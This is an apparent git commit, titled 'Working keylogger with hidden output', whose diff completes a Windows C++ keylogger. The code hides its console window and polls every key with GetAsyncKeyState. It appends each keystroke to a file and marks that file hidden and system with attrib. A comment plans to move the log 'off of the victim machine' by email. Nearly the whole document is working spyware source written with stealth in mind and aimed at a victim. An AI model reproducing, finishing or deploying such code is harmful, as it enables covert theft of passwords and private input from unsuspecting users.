e1f8d7a81eca07ab82897769e33677668f94365d
Ryan <ryanmunger10@gmail.com>
2023-09-19 23:50:09 -0400

    Working keylogger with hidden output

--- logger.cpp
+++ logger.cpp
@@ -1,31 +1,32 @@
-#include <iostrean>
+#include <iostream>
 #include <fstream>
-#include <windows.h
+#include <windows.h>
 #include <bits/stdc++.h>
+#include <ctime>
 
 // path to log file
-// TODO make this hidden?
 #define LOG_FILE "collected.txt"
 
 // save the data to the log file
-void collectData(std::string data)
+void saveData(std::string data)
 {
     std::fstream logFile;
 
     // open the file
     // std::ios::app makes new daata append instead of overwriting
-    logFile.open(LOG_FILE, std::ios::app)
+    logFile.open(LOG_FILE, std::ios::app);
 
-        // write the data
-        logFile << data;
+    // write the data
+    logFile << data;
 
     // end fiel stream
     logFile.close();
 }
 
 // conversions for special keys (space, enter, tab etc)
-std::string translateKey(int key) {
-    std::string result; 
+std::string translateKey(int key)
+{
+    std::string result;
 
     switch (key)
     {
@@ -60,36 +61,51 @@ std::string translateKey(int key) {
     return result;
 }
 
-int main(){
+//TODO - move collected.txt off of the victim machine somehow? email it?
+int main()
+{
+    // sets up the text file storing our data 
+    // hides the file
+    time_t ttime = time(0);
+    char* dt = ctime(&ttime);
+    std::string begin = "Current Local Date & Time: " + (std::string)dt + "\nBegin of log: \n";
+    saveData(begin);
+    system("attrib +h +s collected.txt");
 
-    int specialKeyArray[] =  {VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU};
+    int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU};
     std::string specialKeyChar;
-    bool isSpecialKey; 
+    bool isSpecialKey;
 
     // Hide terminal window
-    HWND window = getConsoleWindow();
+    HWND window = GetConsoleWindow();
     ShowWindow(window, SW_HIDE);
 
     // loop for program's duration
-    while(true){
+    while (true)
+    {
         // iterate through each key
-        for(int key = 8; key <=190; key++){
-            //check for key press
-            if(GetAsyncKeyState(key) == -32767){
-                // key is being pressed 
+        for (int key = 8; key <= 190; key++)
+        {
+            // check for key press
+            if (GetAsyncKeyState(key) == -32767)
+            {
+                // key is being pressed
                 // is key special key
                 isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
-                
-                if(isSpecialKey){
-                // translate special key to string
-                specialKeyChar = translateKey(key);
-                // save this data
-                saveData(specialKeyChar);
-                } else {
+
+                if (isSpecialKey)
+                {
+                    // translate special key to string
+                    specialKeyChar = translateKey(key);
+                    // save this data
+                    saveData(specialKeyChar);
+                }
+                else
+                {
                     // regular key
-                    saveData(key);
+                    saveData(std::string(1, (char)key));
                 }
             }
-        } 
+        }
     }
 }
